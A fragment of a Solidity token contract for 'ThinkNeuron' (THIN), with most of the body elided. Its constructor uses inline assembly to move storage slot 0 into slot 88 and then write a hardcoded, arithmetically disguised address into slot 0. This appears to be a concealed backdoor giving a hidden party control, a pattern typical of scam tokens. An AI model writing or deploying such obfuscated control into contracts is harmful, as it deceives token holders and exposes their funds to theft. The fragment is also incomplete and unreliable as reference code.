...
contract ThinkNeuron {
    string public constant name = "ThinkNeuron";
    string public constant symbol = "THIN";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(319959769182923570817133823853282868669925239572, 3))}
